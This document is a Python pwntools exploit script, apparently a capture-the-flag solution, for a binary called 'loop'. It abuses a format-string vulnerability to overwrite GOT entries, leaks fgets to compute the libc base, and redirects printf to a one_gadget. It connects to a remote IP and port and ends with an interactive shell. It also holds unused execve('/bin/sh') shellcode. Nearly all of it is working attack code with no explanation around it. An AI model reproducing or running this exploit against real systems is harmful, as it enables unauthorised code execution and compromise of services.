from pwn import *
from struct import *

nops = b'\x90'
padding = b'\x00'


clean = lambda x:  x.split('\n')[1:-2]
pad = lambda x:  x + padding*(8-len(x))


elf = ELF('./loop')
context.binary = './loop'
libc = ELF('./libc.so.6')
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")

main_addr = 0x400805
shellcode_addr = 0x4007b8

def exec_fmt(payload):
    p = elf.process()
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

def first_stage(r):
    r.readline()
    r.clean()
    payload_return2main = fmtstr_payload(offset, {elf.got['puts']:main_addr})
    r.sendline(payload_return2main)
    r.readline()
    r.clean()

def leak_libc(r):
    payload_leakfgets = b'%13$s   ' + p64(elf.got['fgets']) + b'\x00'
    r.sendline(payload_leakfgets)
    result = r.readline()
    fgets_leak = u64(pad(result[6:12]))
    print("fgets Leaked address: ", hex(fgets_leak))
    r.clean()
    libc_base = fgets_leak - libc.sym.fgets 
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    assert (libc_base & 0x0000000000000fff) == 0, "ALERT! Program is probably using different libc than specified!"
    return libc_base

shellcode_asm = 'xor rax, rax; xor rdx,rdx; xor rsi,rsi; mov rbx,0x68732f2f6e69622f; push rbx; push rsp; pop rdi; mov rax, 59; syscall; nop'
shellcode = asm(shellcode_asm)  # 32 byte shellcode

def exploit(local=False, one_gadget = 0xf02a4):
    if local is False:
        r = remote('15.165.78.226', 2311)
    else:
        r = elf.process() 
        gdb.attach(r.pid, """c""")
    first_stage(r)
    libc_base = leak_libc(r)
    print('libc leaked!')
    gad = libc_base + one_gadget
    payload_one_gadget = fmtstr_payload(offset, {elf.got['printf']:gad}, write_size='short')
    r.sendline(payload_one_gadget)
    print(r.clean())
    return r

a = exploit(False, 0xf02a4)
a.interactive()